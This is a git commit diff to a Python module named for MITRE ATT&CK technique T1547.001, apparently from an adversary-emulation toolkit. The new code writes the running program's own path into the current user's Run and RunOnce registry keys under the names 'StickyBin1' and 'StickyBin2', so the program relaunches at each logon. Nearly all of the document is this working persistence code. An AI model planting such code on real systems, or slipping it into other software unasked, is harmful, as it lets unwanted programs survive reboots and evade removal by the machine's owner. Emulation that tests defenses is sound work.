8cdfe3fab986d5f90d2771cb37d884046661366a
lehag7 <81866942+lehag7@users.noreply.github.com>
2021-04-17 10:29:26 -0500

    Update T1547-001-SetRegistryPersistence.py

--- Modules/T1547-001-SetRegistryPersistence.py
+++ Modules/T1547-001-SetRegistryPersistence.py
@@ -6,11 +6,20 @@
 """
 import win32api
 import win32con
+import sys
 
 if __name__ == "__main__":
 	print("[+] Setting persistence in the registry.");
 
-	path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, path, 0, win32con.KEY_WRITE);
-	win32api.RegSetValue(key,'', win32con.REG_SZ,'executable');
+	## Gets the program path.
+	file_path = "\"" + win32api.GetFullPathName(sys.argv[0]) + "\"";
+
+	## HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, win32con.KEY_SET_VALUE);
+	win32api.RegSetValueEx(key, 'StickyBin1', 0, win32con.REG_SZ, file_path);
+	win32api.RegCloseKey(key);
+
+	## HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, win32con.KEY_SET_VALUE);
+	win32api.RegSetValueEx(key, 'StickyBin2', 0, win32con.REG_SZ, file_path);
 	win32api.RegCloseKey(key);
